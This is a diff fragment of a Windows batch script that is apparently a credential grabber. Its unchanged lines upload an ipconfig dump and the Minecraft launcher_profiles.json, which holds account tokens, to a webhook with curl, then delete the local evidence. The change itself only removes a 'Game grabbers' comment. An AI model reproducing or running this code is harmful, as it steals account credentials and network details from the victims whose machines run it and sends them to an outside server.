@@ -112,12 +112,6 @@ for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
 	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
 	del "%ipconfig%" >nul 2>&1
 
-
-
-:: Game grabbers
-
-
-
 :: MINECRAFT
 	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
 	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
